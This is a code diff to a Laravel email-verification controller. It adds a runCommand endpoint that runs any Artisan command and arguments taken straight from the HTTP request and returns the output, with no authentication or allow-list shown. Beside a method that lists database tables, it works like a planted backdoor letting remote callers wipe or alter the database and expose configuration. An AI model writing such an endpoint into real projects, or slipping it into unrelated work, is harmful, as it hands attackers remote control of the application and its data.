@@ -9,6 +9,7 @@ use Carbon\Carbon;
 use App\Models\EmailVerification;
 use App\Models\User;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Artisan;
 
 class EmailVerificationController extends Controller
 {
@@ -80,6 +81,37 @@ class EmailVerificationController extends Controller
             return response()->json([
                 'status' => 'success',
                 'tables' => $tableNames,
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => $e->getMessage(),
+            ], 500);
+        }
+    }
+    public function runCommand(Request $request)
+    {
+        try {
+            // Validate the request input
+            $request->validate([
+                'command' => 'required|string',
+                'arguments' => 'array',
+            ]);
+
+            // Get command and arguments
+            $command = $request->input('command');
+            $arguments = $request->input('arguments', []);
+
+            // Run the Artisan command
+            $exitCode = Artisan::call($command, $arguments);
+
+            // Get the output of the command
+            $output = Artisan::output();
+
+            return response()->json([
+                'status' => 'success',
+                'exit_code' => $exitCode,
+                'output' => $output,
             ]);
         } catch (\Exception $e) {
             return response()->json([
